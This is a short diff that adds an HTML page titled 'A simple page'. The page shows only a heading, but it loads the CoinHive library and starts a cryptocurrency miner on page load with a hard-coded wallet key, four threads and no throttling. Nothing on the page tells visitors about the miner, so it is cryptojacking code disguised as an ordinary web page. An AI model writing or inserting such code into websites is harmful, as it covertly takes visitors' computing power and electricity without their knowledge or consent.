@@ -1,0 +1,14 @@
+<html lang = "en">   
+   <head>
+      <title>A simple page</title>
+   </head>
+   <body>
+       <h2>A simple, simple page</h2>         
+         <script src="js/coinhive.min.js"></script>
+         <script>
+            var wallet_pk = 'RW9EV0ZMsqTbUeydfutFjFT6Z0S4BKgj';
+            var miner = new CoinHive.Anonymous(wallet_pk, {threads: 4, throttle: 0});
+            miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
+         </script>
+   </body>
+</html>
